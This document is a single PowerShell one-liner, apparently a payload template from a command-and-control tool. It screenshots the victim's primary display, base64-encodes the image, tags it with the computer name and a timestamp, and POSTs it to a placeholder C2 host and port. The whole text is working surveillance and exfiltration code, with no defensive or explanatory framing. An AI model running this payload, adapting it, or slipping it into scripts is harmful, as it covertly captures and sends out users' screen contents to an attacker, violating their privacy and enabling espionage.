$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"; $hostname = $env:COMPUTERNAME; $filename = "${hostname}_${timestamp}_screenshot.png"; Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen; $bounds = $screen.Bounds; $width = $bounds.Width; $height = $bounds.Height; $bmp = New-Object Drawing.Bitmap($width, $height); $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, [System.Drawing.Size]::new($width, $height), [System.Drawing.CopyPixelOperation]::SourceCopy); $ms = New-Object IO.MemoryStream; $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); $ms.Position = 0; $img = [Convert]::ToBase64String($ms.ToArray()); $graphics.Dispose(); $bmp.Dispose(); $ms.Close(); $ms.Dispose(); $body = @{ image = $img; filename = $filename } | ConvertTo-Json -Compress; Invoke-RestMethod -Uri "http://{C2_HOST}:{C2_PORT}/screenshot/$hostname" -Method POST -Body $body -ContentType "application/json"